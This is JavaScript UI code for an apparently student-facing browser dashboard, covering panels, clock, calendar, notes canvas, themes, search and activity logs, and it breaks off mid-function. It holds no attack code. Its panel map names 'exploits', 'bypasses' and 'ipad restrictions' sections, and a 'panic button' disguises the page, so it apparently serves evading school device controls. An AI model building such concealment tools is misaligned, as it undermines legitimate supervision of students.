    // --- Dashboard Module ---
    const dashboard = {
      canvas: null, ctx: null, drawing: false,
      drawingHistory: [], redoHistory: [], // For canvas undo/redo
      currentLineColor: '#ff914d', currentLineThickness: 2,

      // Map search queries to actual panel IDs
      dashboardPanelMap: {
          'calendar': 'calendarBox', 'motivation': 'motivationBox', 'updates': 'updatesBox',
          'notifications': 'notificationsBox', 'wifi information': 'wifiPanel', 'school wifi': 'wifiPanel',
          'ipad restrictions': 'ipadPanel', 'handbooks': 'handbookPanel', 'school map': 'mapPanel',
          'student websites': 'studentWebsitesPanel', 'teacher websites': 'teacherWebsitesPanel',
          'phone directory': 'phoneDirectoryPanel', 'camera information': 'cameraPanel', 'school info': 'schoolInfoPanel',
          'school information': 'schoolInfoPanel', 'exploits': 'exploitPanel', 'bypasses': 'bypassPanel',
          'vpn': 'vpnPanel', 'gaming': 'gamingPanel', 'music': 'musicPanel',
          'keyboard tricks': 'keyboardPanel', 'settings': 'settingsPanel', 'keybinds': 'keybindsPanel',
          'utilities': 'utilitiesPanel', 'calculator': 'calculatorPanel', 'unit converter': 'unitConverterPanel',
          'stats': 'statsPanel', 'media': 'mediaPanel', 'reminders': 'remindersPanel',
          'dashboard logs': 'activityLogsDashboardPanel', 'activity logs': 'activityLogsDashboardPanel',
          'login history': 'loginHistoryPanel', 'random fact': 'randomFactBox', 'daily quote': 'dailyQuoteBox',
          'notes': 'canvasContainer',
      },

      // Initializes all dashboard functionalities
      init: function() {
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initButtons();
        this.initCanvas();
        this.initPanels(); // Also renders initial layout from storage
        this.loadThemes(); // Ensure consistent theme
        this.initPanelInteractions(); // Combines drag/resize with persistence
        this.initRandomContent();
        this.initSettingsPanel();
        this.initCalculator();
        this.initUnitConverter();
        this.initUtilities();
        this.initKeybindsPanel();
        this.initReminders();
        this.initStatsButton();
        this.initMediaButton();
        
        renderDashboardStats();
        renderActivityLogs('dashboardActivityLogs');
        this.showWelcomeNotification(document.getElementById('loggedInUser').textContent);
        document.body.style.zoom = globalZoomLevel; // Apply stored global zoom
      },

      // Shows the welcome notification
      showWelcomeNotification: function(username) {
          const storedPreference = localStorage.getItem(LS_WELCOME_NOTIFICATION_DISPLAY);
          const showNotif = (storedPreference === null || storedPreference === 'true');
          if (showNotif) {
              showNotification(`Welcome, ${username}!`);
              trackActivity('DASHBOARD_NOTIFICATION', `Welcome notification shown for ${username}`);
          }
      },

      // Loads the saved theme from local storage and applies it
      loadThemes: function() {
          const savedTheme = localStorage.getItem(LS_THEME);
          document.body.classList.remove('dark-theme', 'light-theme', 'blue-theme');
          document.body.classList.add(savedTheme || 'dark-theme'); // Apply dark as default if none saved

          const themeSelect = document.getElementById('themeSelect');
          if (themeSelect) {
            themeSelect.value = savedTheme || 'dark-theme';
            const themeBtn = document.getElementById('themeToggle');
            if (themeBtn) {
                if (document.body.classList.contains('light-theme')) {
                    themeBtn.innerText = '☀️ Light Mode';
                } else if (document.body.classList.contains('blue-theme')) {
                    themeBtn.innerText = '🟦 Blue Mode';
                } else {
                    themeBtn.innerText = '🌙 Dark Mode';
                }
            }
          }
      },
      
      // Initializes draggable and resizable panel interactions using Interact.js
      initPanelInteractions: function() {
        const layoutConfig = JSON.parse(localStorage.getItem(LS_DASHBOARD_LAYOUT) || '{}');
        const allDraggableElements = document.querySelectorAll('.box, .info-panel'); // Target both main boxes and info panels

        allDraggableElements.forEach(element => {
            const savedLayout = layoutConfig[element.id];
            if (savedLayout) {
                element.style.width = savedLayout.width || '';
                element.style.height = savedLayout.height || '';
                element.style.transform = `translate(${savedLayout.x || 0}px, ${savedLayout.y || 0}px)`;
                element.dataset.x = savedLayout.x || 0;
                element.dataset.y = savedLayout.y || 0;
            } else {
                // If no saved layout, initialize data-x/y to 0 if not present
                element.dataset.x = element.dataset.x || 0;
                element.dataset.y = element.dataset.y || 0;
            }
        });

        const toggleDragHandlesCheckbox = document.getElementById('toggleDragHandles');
        const savedHandleVisibility = JSON.parse(localStorage.getItem(LS_DRAG_HANDLES_TOGGLE) || 'true');
        
        const applyHandleVisibility = (isVisible) => {
            document.querySelectorAll('.panel-handle').forEach(handle => {
                handle.style.opacity = isVisible ? '1' : '0';
                handle.style.pointerEvents = isVisible ? 'auto' : 'none';
            });
            // Ensure interact.js resize handles (dynamically added) are also visible/hidden
            document.querySelectorAll('.interact-resizable-resizing > .interact-handle').forEach(handle => {
                 handle.style.display = isVisible ? 'block' : 'none';
            });
        }

        if (toggleDragHandlesCheckbox) {
          toggleDragHandlesCheckbox.checked = savedHandleVisibility;
          applyHandleVisibility(savedHandleVisibility);

          toggleDragHandlesCheckbox.addEventListener('change', (e) => {
              const isVisible = e.target.checked;
              applyHandleVisibility(isVisible);
              localStorage.setItem(LS_DRAG_HANDLES_TOGGLE, isVisible);
              trackActivity('DASHBOARD_SETTINGS', `Panel drag handles toggled ${isVisible ? 'on' : 'off'}`);
              showNotification(`Panel drag handles ${isVisible ? 'shown' : 'hidden'}.`);
          });
        } else {
            // Apply default visibility if checkbox doesn't exist yet (e.g., initial load before initSettingsPanel)
            applyHandleVisibility(savedHandleVisibility);
        }

        interact('.box, .info-panel').unset(); // Clear existing interactions

        interact('.box, .info-panel')
          .draggable({
            allowFrom: '.panel-handle', // Only drag from the custom handle
            modifiers: [
                interact.modifiers.restrictRect({
                    restriction: 'parent', // Restrict dragging within the dashboard container
                    endOnly: true
                })
            ],
            listeners: {
              start (event) {
                event.target.classList.add('dragging');
                trackActivity('DASHBOARD_PANEL_DRAG', `Started dragging panel: ${event.target.id}`);
              },
              move (event) {
                const target = event.target;
                const x = (parseFloat(target.dataset.x) || 0) + event.dx;
                const y = (parseFloat(target.dataset.y) || 0) + event.dy;

                target.style.transform = `translate(${x}px, ${y}px)`;
                target.dataset.x = x;
                target.dataset.y = y;
              },
              end (event) {
                event.target.classList.remove('dragging');
                // Save final position to local storage
                const currentLayout = JSON.parse(localStorage.getItem(LS_DASHBOARD_LAYOUT) || '{}');
                currentLayout[event.target.id] = {
                    x: event.target.dataset.x,
                    y: event.target.dataset.y,
                    width: event.target.style.width,
                    height: event.target.style.height
                };
                localStorage.setItem(LS_DASHBOARD_LAYOUT, JSON.stringify(currentLayout));
                updateStats('panelsMoved');
                trackActivity('DASHBOARD_PANEL_DRAG', `Stopped dragging panel: ${event.target.id} to (${event.target.dataset.x}, ${event.target.dataset.y})`);
              }
            }
          })
          .resizable({
            edges: { left: true, right: true, bottom: true, top: false }, // Only resize from left, right, bottom for now
            invert: 'none',
            modifiers: [
                interact.modifiers.restrictEdges({
                    outer: 'parent',
                    endOnly: true
                }),
                interact.modifiers.restrictSize({
                    min: { width: 150, height: 100 } // Minimum panel size
                })
            ],
            listeners: {
                move (event) {
                    const target = event.target;
                    let x = parseFloat(target.dataset.x) || 0;
                    let y = parseFloat(target.dataset.y) || 0;

                    // Update width, height and translate element if resizing from left/top
                    target.style.width = event.rect.width + 'px';
                    target.style.height = event.rect.height + 'px';

                    x += event.deltaRect.left;
                    y += event.deltaRect.top;

                    target.style.transform = `translate(${x}px,${y}px)`;

                    Object.assign(target.dataset, { x, y });
                },
                end (event) {
                    const currentLayout = JSON.parse(localStorage.getItem(LS_DASHBOARD_LAYOUT) || '{}');
                    currentLayout[event.target.id] = {
                        x: event.target.dataset.x,
                        y: event.target.dataset.y,
                        width: event.target.style.width,
                        height: event.target.style.height
                    };
                    localStorage.setItem(LS_DASHBOARD_LAYOUT, JSON.stringify(currentLayout));
                    updateStats('panelsResized');
                    trackActivity('DASHBOARD_PANEL_RESIZE', `Resized panel: ${event.target.id} to (${event.rect.width}x${event.rect.height})`);
                }
            }
          });
      },
      
      // Initializes the session time display
      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        const sessionTimeElement = document.getElementById('sessionTime');
        if (sessionTimeElement) {
            function updateSessionTime() {
                sessionSeconds++;
                sessionTimeElement.innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
            }
            updateSessionTime();
            setInterval(updateSessionTime, 1000);
        }
      },
      
      // Initializes the real-time clock and date for the dashboard
      initClock: function() {
        const realTimeClockElement = document.getElementById('realTimeClock');
        const realDateElement = document.getElementById('realDate');
        
        if (realTimeClockElement && realDateElement) {
            function updateDashboardClock() {
              const now = new Date();
              const options = { 
                  hour: 'numeric', 
                  minute: 'numeric', 
                  second: 'numeric', 
                  hour12: !is24HourFormat 
              };
              const timeStr = now.toLocaleTimeString(undefined, options);
              const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

              realTimeClockElement.innerText = '🕒 ' + timeStr;
              realDateElement.innerText = '📅 ' + dateStr;
            }
            updateDashboardClock();
            setInterval(updateDashboardClock, 1000);
        }
      },
      
      // Generates the calendar view for the current month
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        if (!calendar) return;

        calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          div.style.fontWeight = 'bold';
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },
      
      // Initializes theme toggle button behavior
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        themeBtn?.addEventListener('click', () => {
          let currentTheme = localStorage.getItem(LS_THEME) || 'dark-theme';

          let nextTheme;
          if (currentTheme === 'dark-theme') {
              nextTheme = 'light-theme';
          } else if (currentTheme === 'light-theme') {
              nextTheme = 'blue-theme';
          } else { // currentTheme === 'blue-theme'
              nextTheme = 'dark-theme';
          }

          document.body.classList.remove('dark-theme', 'light-theme', 'blue-theme');
          if (nextTheme !== 'dark-theme') {
            document.body.classList.add(nextTheme);
            localStorage.setItem(LS_THEME, nextTheme);
          } else {
            localStorage.removeItem(LS_THEME); // Clears to default dark-theme
          }
          trackActivity('DASHBOARD_THEME', `Switched theme to: ${nextTheme}`);
          showNotification(`Theme changed to ${nextTheme.replace('-theme', '')}.`);
          this.loadThemes(); // Update button text and settings dropdown
        });
        this.loadThemes(); // Initial load to ensure correct button text
      },
      
      // Initializes various dashboard buttons and their actions
      initButtons: function() {
        document.getElementById('panicBtn')?.addEventListener('click', () => {
          window.open('https://clever.com', '_blank');
          trackActivity('DASHBOARD_ACTION', 'Panic button clicked');
        });

        document.getElementById('restartBtn')?.addEventListener('click', () => {
          if(confirm('Are you sure you want to kill the page (restart)? All unsaved changes will be lost.')) {
            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Refresh to continue.</div>`;
            trackActivity('DASHBOARD_ACTION', 'Page restart initiated');
          }
        });

        document.getElementById('fixIssuesBtn')?.addEventListener('click', () => {
          showNotification('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!');
          trackActivity('DASHBOARD_ACTION', 'Fix issues button clicked');
        });
        
        document.getElementById('fullScreenBtn')?.addEventListener('click', () => {
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              showNotification(`Error: Full-screen mode denied: ${err.message}`);
            });
            trackActivity('DASHBOARD_ACTION', 'Full screen enabled');
            showNotification('Fullscreen mode activated.');
          } else {
            document.exitFullscreen();
            trackActivity('DASHBOARD_ACTION', 'Full screen disabled');
            showNotification('Fullscreen mode deactivated.');
          }
        });
        
        const zoomStep = 0.1;
        const minZoom = 0.5;
        const maxZoom = 2;

        document.getElementById('zoomInBtn')?.addEventListener('click', () => {
          if (globalZoomLevel < maxZoom) {
            globalZoomLevel += zoomStep;
            document.body.style.zoom = globalZoomLevel;
            localStorage.setItem('globalZoomLevel', globalZoomLevel); // Persist zoom level
            trackActivity('DASHBOARD_ZOOM', `Zoomed in to ${globalZoomLevel.toFixed(1)}`);
            showNotification(`Zoom: ${Math.round(globalZoomLevel * 100)}%`);
          } else {
            showNotification('Cannot zoom in further.');
          }
        });

        document.getElementById('zoomOutBtn')?.addEventListener('click', () => {
          if (globalZoomLevel > minZoom) {
            globalZoomLevel -= zoomStep;
            document.body.style.zoom = globalZoomLevel;
            localStorage.setItem('globalZoomLevel', globalZoomLevel); // Persist zoom level
            trackActivity('DASHBOARD_ZOOM', `Zoomed out to ${globalZoomLevel.toFixed(1)}`);
            showNotification(`Zoom: ${Math.round(globalZoomLevel * 100)}%`);
          } else {
            showNotification('Cannot zoom out further.');
          }
        });

        document.getElementById('logoutBtn')?.addEventListener('click', () => {
            if (confirm('Are you sure you want to log out? All unsaved data might be lost.')) {
                window.location.reload();
                trackActivity('DASHBOARD_ACTION', 'Logged out');
                showNotification('Logged out successfully.');
            }
        });

        document.getElementById('activityLogsDashboardBtn')?.addEventListener('click', () => {
            dashboard.togglePanel('activityLogsDashboardPanel');
            trackActivity('DASHBOARD_ACTION', 'Viewed Dashboard Activity Logs');
        });

        document.getElementById('clearDashboardLogsBtn')?.addEventListener('click', () => {
            if (confirm('Are you sure you want to clear ALL dashboard activity logs? (Login-specific logs remain)')) {
                activityLogs = activityLogs.filter(log => log.type.startsWith('LOGIN_')); // Only keep login logs
                localStorage.setItem(LS_ACTIVITY_LOGS, JSON.stringify(activityLogs));
                renderActivityLogs('dashboardActivityLogs');
                showNotification('Dashboard activity logs cleared.');
                trackActivity('DASHBOARD_ACTION', 'Cleared dashboard activity logs');
            }
        });

        document.getElementById('downloadActivityLogsBtn')?.addEventListener('click', () => {
            const logsData = JSON.stringify(activityLogs, null, 2); // Pretty-print JSON
            const blob = new Blob([logsData], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `private_system_all_activity_logs_${new Date().toISOString().replace(/:/g, '-')}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showNotification('All activity logs downloaded!');
            trackActivity('DASHBOARD_ACTION', 'Downloaded all activity logs');
        });

        document.getElementById('loginHistoryBtn')?.addEventListener('click', () => {
            dashboard.togglePanel('loginHistoryPanel');
            trackActivity('DASHBOARD_ACTION', 'Viewed Login History Panel');
        });

        document.getElementById('clearLoginHistoryBtn')?.addEventListener('click', () => {
            if (confirm('Are you sure you want to clear your login history? This cannot be undone.')) {
                localStorage.removeItem(LS_LOGIN_HISTORY);
                document.getElementById('loginHistoryPanelContent').innerHTML = '<p style="color:#aaa; padding: 10px;">No login history yet.</p>';
                trackActivity('DASHBOARD_ACTION', 'Cleared login history');
                showNotification('Login history cleared.');
            }
        });

        // Search Bar functionality
        const searchBar = document.getElementById('dashboardSearchBar');
        searchBar?.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const query = searchBar.value.trim().toLowerCase();
                if (query) {
                    trackActivity('DASHBOARD_SEARCH', `Searched for "${query}"`);
                    updateStats('searchesMade');
                    const targetId = dashboard.dashboardPanelMap[query];
                    const targetElement = targetId ? document.getElementById(targetId) : null;
                    if (targetElement) {
                        targetElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
                        // Highlight found element briefly
                        targetElement.classList.add('highlight');
                        setTimeout(() => targetElement.classList.remove('highlight'), 2000);

                        // If it's a hidden info-panel, make it visible
                        if (targetElement.classList.contains('info-panel') && targetElement.style.display === 'none') {
                            dashboard.openPanelById(targetId);
                        } else if (targetId === 'canvasContainer' && targetElement.style.display === 'none') {
                            document.getElementById('notesBtn')?.click(); // Open notes if closed
                        }
                        showNotification(`Navigated to: ${query}`);
                    } else {
                        showNotification(`No section found for "${query}". Try terms like "calendar", "settings", "wifi information", "notes".`);
                    }
                }
                e.target.value = '';
            }
        });
      },
      
      // Initializes the canvas for drawing and text notes
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid');
        const updatesNotifications = document.getElementById('updatesNotifications');
        this.canvas = document.getElementById('notesCanvas');
        this.ctx = this.canvas?.getContext('2d');
        if (!this.canvas || !this.ctx) {
            console.error('Canvas or context not available!');
            return;
        }

        const undoCanvasBtn = document.getElementById('undoCanvasBtn');
        const noteColorPicker = document.getElementById('noteColorPicker');
        const noteThicknessSlider = document.getElementById('noteThicknessSlider');
        const toggleTextNotesBtn = document.getElementById('toggleTextNotesBtn');
        const textNotesArea = document.getElementById('textNotesArea');

        // Load existing text notes from storage
        const savedTextNotes = localStorage.getItem(LS_NOTES_TEXT);
        if (savedTextNotes) {
            textNotesArea.value = savedTextNotes;
            textNotesArea.dataset.saved = 'true';
        } else {
             textNotesArea.dataset.saved = 'false';
        }

        // Initialize canvas background (ensures white if not loaded from state)
        this.ctx.fillStyle = '#fff';
        this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);

        // Load saved canvas drawing if available (more advanced: storing strokes or base64)
        // For 'more better' without external libs for vector graphic serialisation, this remains a challenge.
        // Keeping drawingHistory for basic undo is enough for simple strokes.

        notesBtn?.addEventListener('click', () => {
          mainGrid.style.display = 'none';
          updatesNotifications.style.display = 'none';
          canvasContainer.style.display = 'block';
          trackActivity('DASHBOARD_ACTION', 'Opened Notes Canvas');
          this.canvas.scrollIntoView({ behavior: 'smooth', block: 'center' });
          if (textNotesArea.style.display !== 'block') {
            textNotesArea.style.display = 'block'; // Show text area by default when opening notes
            toggleTextNotesBtn.textContent = 'Hide Text Notes';
          }
          showNotification('Notes canvas opened.');
        });

        document.getElementById('closeCanvasBtn')?.addEventListener('click', () => {
          canvasContainer.style.display = 'none';
          mainGrid.style.display = 'flex';
          updatesNotifications.style.display = 'flex';
          textNotesArea.style.display = 'none'; // Always hide text area when closing the full notes panel
          trackActivity('DASHBOARD_ACTION', 'Closed Notes Canvas');
          showNotification('Notes canvas closed.');

          // Save text notes when closing the panel if any changes were made
          localStorage.setItem(LS_NOTES_TEXT, textNotesArea.value);
          if (textNotesArea.value.trim() !== '' && textNotesArea.dataset.saved === 'false') {
            updateStats('notesSaved');
            textNotesArea.dataset.saved = 'true';
          }
          toggleTextNotesBtn.textContent = '✍️ Toggle Text Notes'; // Reset button text
        });

        document.getElementById('clearCanvasBtn')?.addEventListener('click', () => {
          this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
          this.ctx.fillStyle = '#fff';
          this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);
          this.drawingHistory = [];
          this.redoHistory = [];
          showNotification('Canvas cleared!');
          trackActivity('CANVAS_ACTION', 'Cleared Canvas');
        });

        undoCanvasBtn?.addEventListener('click', () => {
            if (this.drawingHistory.length > 0) {
                const lastStroke = this.drawingHistory.pop();
                this.redoHistory.push(lastStroke);

                this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
                this.ctx.fillStyle = '#fff';
                this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);

                this.drawingHistory.forEach(stroke => {
                    this.ctx.beginPath();
                    this.ctx.moveTo(stroke[0].x, stroke[0].y);
                    this.ctx.strokeStyle = stroke[0].color;
                    this.ctx.lineWidth = stroke[0].thickness;
                    this.ctx.lineCap = 'round';
                    stroke.slice(1).forEach(point => this.ctx.lineTo(point.x, point.y));
                    this.ctx.stroke();
                });
                showNotification('Last drawing stroke undone.');
                trackActivity('CANVAS_ACTION', 'Undid last canvas drawing stroke');
            } else {
                showNotification('Nothing to undo.');
            }
        });

        noteColorPicker?.addEventListener('input', (e) => {
            this.currentLineColor = e.target.value;
            trackActivity('CANVAS_ACTION', `Changed pen color to ${this.currentLineColor}`);
            showNotification(`Pen color set to ${e.target.value}.`);
        });

        noteThicknessSlider?.addEventListener('input', (e) => {
            this.currentLineThickness = parseInt(e.target.value);
            trackActivity('CANVAS_ACTION', `Changed pen thickness to ${this.currentLineThickness}`);
            showNotification(`Pen thickness set to ${e.target.value}.`);
        });
        
        toggleTextNotesBtn?.addEventListener('click', () => {
            if (textNotesArea.style.display === 'block') {
                textNotesArea.style.display = 'none';
                toggleTextNotesBtn.textContent = '✍️ Show Text Notes';
                showNotification('Text notes hidden.');
                trackActivity('CANVAS_ACTION', 'Hid text notes area');
                localStorage.setItem(LS_NOTES_TEXT, textNotesArea.value); // Save text on hide
            } else {
                textNotesArea.style.display = 'block';
                textNotesArea.focus();
                toggleTextNotesBtn.textContent = 'Hide Text Notes';
                showNotification('Text notes shown.');
                trackActivity('CANVAS_ACTION', 'Shown text notes area');
            }
        });

        textNotesArea?.addEventListener('input', () => {
            textNotesArea.dataset.saved = 'false'; // Mark as unsaved on edit
        });

        document.getElementById('downloadTextNotesBtn')?.addEventListener('click', () => {
            const textContent = textNotesArea.value;
            if (textContent.trim() === '') {
                showNotification('No text notes to download.');
                return;
            }
            const blob = new Blob([textContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `dashboard_text_notes_${new Date().toISOString().replace(/:/g, '-')}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showNotification('Text notes downloaded!');
            trackActivity('CANVAS_ACTION', 'Downloaded text notes');
        });

        this.canvas.addEventListener('mousedown', (e) => {
          this.drawing = true;
          const pos = this.getPos(e);
          this.ctx.beginPath();
          this.ctx.moveTo(pos.x, pos.y);
          this.drawingHistory.push([{ x: pos.x, y: pos.y, color: this.currentLineColor, thickness: this.currentLineThickness }]);
          this.redoHistory = [];
          e.preventDefault();
        });

        this.canvas.addEventListener('mousemove', (e) => {
          if (!this.drawing) return;
          const pos = this.getPos(e);
          this.ctx.lineTo(pos.x, pos.y);
          this.ctx.strokeStyle = this.currentLineColor;
          this.ctx.lineWidth = this.currentLineThickness;
          this.ctx.lineCap = 'round';
          this.ctx.stroke();
          this.drawingHistory[this.drawingHistory.length - 1].push({ x: pos.x, y: pos.y });
          e.preventDefault();
        });

        ['mouseup', 'mouseleave'].forEach(evtName => {
          this.canvas.addEventListener(evtName, () => {
            if (this.drawing) { // Only track if drawing finished
                trackActivity('CANVAS_ACTION', 'Finished drawing stroke');
            }
            this.drawing = false;
          });
        });

        // Touch event handlers for drawing
        this.canvas.addEventListener('touchstart', (e) => {
          this.drawing = true;
          const pos = this.getPos(e);
          this.ctx.beginPath();
          this.ctx.moveTo(pos.x, pos.y);
          this.drawingHistory.push([{ x: pos.x, y: pos.y, color: this.currentLineColor, thickness: this.currentLineThickness }]);
          this.redoHistory = [];
          e.preventDefault();
        });

        this.canvas.addEventListener('touchmove', (e) => {
          if (!this.drawing) return;
          const pos = this.getPos(e);
          this.ctx.lineTo(pos.x, pos.y);
          this.ctx.strokeStyle = this.currentLineColor;
          this.ctx.lineWidth = this.currentLineThickness;
          this.ctx.lineCap = 'round';
          this.ctx.stroke();
          this.drawingHistory[this.drawingHistory.length - 1].push({ x: pos.x, y: pos.y });
          e.preventDefault();
        });

        ['touchend', 'touchcancel'].forEach(evtName => {
          this.canvas.addEventListener(evtName, () => {
            if (this.drawing) { // Only track if drawing finished
                trackActivity('CANVAS_ACTION', 'Finished drawing stroke (touch)');
            }
            this.drawing = false;
          });
        });

        // Screenshot dashboard (whole body)
        document.getElementById('screenshotBtn')?.addEventListener('click', () => {
          html2canvas(document.body, { scale: window.devicePixelRatio || 1, logging: false }).then(canvasImg => {
            const link = document.createElement('a');
            link.download = `dashboard_screenshot_${new Date().toISOString().replace(/:/g, '-')}.png`;
            link.href = canvasImg.toDataURL('image/png');
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            updateStats('screenshotsTaken');
            showNotification('Screenshot of dashboard taken!');
            trackActivity('DASHBOARD_ACTION', 'Screenshot taken');
          });
        });
        
        // Export only canvas content
        document.getElementById('exportNotesBtn')?.addEventListener('click', () => {
          const link = document.createElement('a');
          link.download = `notes_canvas_${new Date().toISOString().replace(/:/g, '-')}.png`;
          link.href = this.canvas.toDataURL('image/png');
          document.body.appendChild(link);
          link.click();
          document.body.removeChild(link);
          showNotification('Notes canvas exported!');
          trackActivity('CANVAS_ACTION', 'Exported canvas notes as PNG');
        });

        // Toggle visibility of main content sections
        const toggleSectionsBtn = document.getElementById('toggleSectionsBtn');
        toggleSectionsBtn?.addEventListener('click', () => {
          const isMainGridHidden = mainGrid.style.display === 'none' || mainGrid.style.display === '';
          mainGrid.style.display = isMainGridHidden ? 'flex' : 'none';
          updatesNotifications.style.display = isMainGridHidden ? 'flex' : 'none';
          toggleSectionsBtn.innerText = isMainGridHidden ? '⬆️ Toggle Sections' : '⬇️ Toggle Sections';
          showNotification(`Dashboard sections ${isMainGridHidden ? 'shown' : 'hidden'}.`);
          trackActivity('DASHBOARD_TOGGLE', `Main sections toggled ${isMainGridHidden ? 'ON' : 'OFF'}`);
        });
      },

      // Helper for getting mouse/touch position relative to canvas
      getPos: function(evt) {
          const rect = this.canvas.getBoundingClientRect();
          const currentZoom = parseFloat(document.body.style.zoom || '1'); // Account for page zoom
          const scaleX = this.canvas.width / (rect.width * currentZoom);
          const scaleY = this.canvas.height / (rect.height * currentZoom);
          return {
            x: ((evt.clientX || evt.touches[0].clientX) - rect.left) * scaleX,
            y: ((evt.clientY || evt.touches[0].clientY) - rect.top) * scaleY
          };
      },

      // Initializes random fact and daily quote display with rotation
      initRandomContent: function() {
        const randomFacts = [
            "A group of owls is called a parliament.", "Honey never spoils.", "The shortest war in history was between Britain and Zanzibar on August 27, 1896. Zanzibar surrendered after 38 minutes.",
            "There are more possible iterations of a game of chess than there are atoms in the known universe.", "Octopuses have three hearts.", "The human nose can remember 50,000 different scents.",
            "Flamingos can only eat with their heads upside down.", "The Great Wall of China is not visible from the moon with the naked eye.", "A cloud can weigh more than a million pounds.",
            "Wombat poop is cube-shaped."
        ];
        const dailyQuotes = [
            { text: "The only way to do great work is to love what you do.", author: "Steve Jobs" }, { text: "Believe you can and you're halfway there.", author: "Theodore Roosevelt" },
            { text: "The future belongs to those who believe in the beauty of their dreams.", author: "Eleanor Roosevelt" }, { text: "Strive not to be a success, but rather to be of value.", author: "Albert Einstein" },
            { text: "The mind is everything. What you think you become.", author: "Buddha" }, { text: "The only limit to our realization of tomorrow will be our doubts of today.", author: "Franklin D. Roosevelt" },
            { text: "It is our choices, Harry, that show what we truly are, far more than our abilities.", author: "J.K. Rowling" }, { text: "Life is what happens when you're busy making other plans.", author: "John Lennon" },
            { text: "The best way to predict the future is to create it.", author: "Peter Drucker" }, { text: "Twenty years from now you will be more disappointed by the things that you didn't do than by the ones you did do.", author: "Mark Twain" }
        ];

        const randomFactEl = document.getElementById('randomFactContent');
        const dailyQuoteEl = document.getElementById('dailyQuoteContent');

        const updateFact = () => {
            if (randomFactEl) randomFactEl.textContent = randomFacts[Math.floor(Math.random() * randomFacts.length)];
            trackActivity('DASHBOARD_CONTENT', 'Random fact updated');
        };
        const updateQuote = () => {
            if (dailyQuoteEl) {
                const quote = dailyQuotes[Math.floor(Math.random() * dailyQuotes.length)];
                dailyQuoteEl.textContent = `"${quote.text}" - ${quote.author}`;
            }
            trackActivity('DASHBOARD_CONTENT', 'Daily quote updated');
        };
        
        updateFact(); setInterval(updateFact, 30000); // Update fact every 30 seconds
        updateQuote(); setInterval(updateQuote, 60000); // Update quote every 60 seconds
      },
      
      // Hides all info-panels and content areas initially
      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.style.display = 'none';
        });
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
      },

      // Opens a specific info-panel (also handles non-info-panel "boxes")
      openPanelById: function(panelId) {
          const panel = document.getElementById(panelId);
          if (panel) {
              // For main grid boxes (calendar, motivation, etc.), they might not always be `display: none` by default,
              // but ensures visibility if some toggle had hidden them. Search also handles scroll-to-view.
              if (panel.classList.contains('box') && panel.style.display === 'none') {
                panel.style.display = 'flex'; // Default display for `main-row` items
              }
              // For actual `info-panel`s, this explicitly opens it
              if (panel.classList.contains('info-panel')) {
                  // Ensure other panels are closed before opening this one, like togglePanel does
                  document.querySelectorAll('.info-panel').forEach(p => {
                      if (p.id !== panelId && p.style.display === 'block') {
                          p.style.display = 'none';
                          updateStats('panelsClosed');
                          trackActivity('DASHBOARD_PANEL_CLOSE', `Closed panel (via search): ${p.id}`);
                      }
                  });
                  panel.style.display = 'block';
                  updateStats('panelsOpened');
                  trackActivity('DASHBOARD_PANEL_OPEN', `Opened panel (via search): ${panelId}`);
              }
          }
      },
      
      // Toggles visibility of a specific info-panel (and closes others)
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        if (!panel) {
            console.warn(`Panel with ID ${panelId} not found.`);
            showNotification(`Error: Panel "${panelId}" not found.`);
            return;
        }
        
        const wasOpen = panel.style.display === 'block';

        // Close all other info-panels
        document.querySelectorAll('.info-panel').forEach(p => {
            if (p.id !== panelId && p.style.display === 'block') {
                p.style.display = 'none';
                updateStats('panelsClosed');
                trackActivity('DASHBOARD_PANEL_CLOSE', `Closed panel: ${p.id}`);
            }
        });
        
        // Toggle the requested panel
